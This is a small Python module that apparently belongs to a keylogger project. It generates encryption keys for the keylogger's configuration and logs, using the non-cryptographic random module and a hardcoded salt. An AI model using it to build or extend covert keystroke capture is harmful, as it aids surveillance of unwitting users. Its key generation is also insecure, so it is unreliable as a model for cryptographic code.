import config
import random


def generate_random_string(length: int, alth: set):
    string = ''

    for _ in range(length):
        string += random.choice(alth)

    return string


def create_encryption_keys():
    encryption_keys_sample = config.encryption_keys_sample

    configuration_ek = generate_random_string(
        config.encryption_key_length, config.encryption_alth)

    keylogger_ek = generate_random_string(
        config.encryption_key_length, config.encryption_alth)

    log_ek = generate_random_string(
        config.encryption_key_length, config.encryption_alth)

    salt = "Billy_is_the_best"

    encryption_keys = encryption_keys_sample.format(
        configuration_ek=configuration_ek, keylogger_ek=keylogger_ek, log_ek=log_ek, salt=salt)

    with open(config.encryption_keys_path, 'w', encoding='utf-8') as file:
        file.write(encryption_keys)

    answer = {'configuration_ek': ['Configuration encryption key', configuration_ek],
              'keylogger_ek': ['Keylogger encryption key', keylogger_ek],
              'log_ek': ['Log encryption key', log_ek],
              'salt': ['Salt', salt], }
    return answer
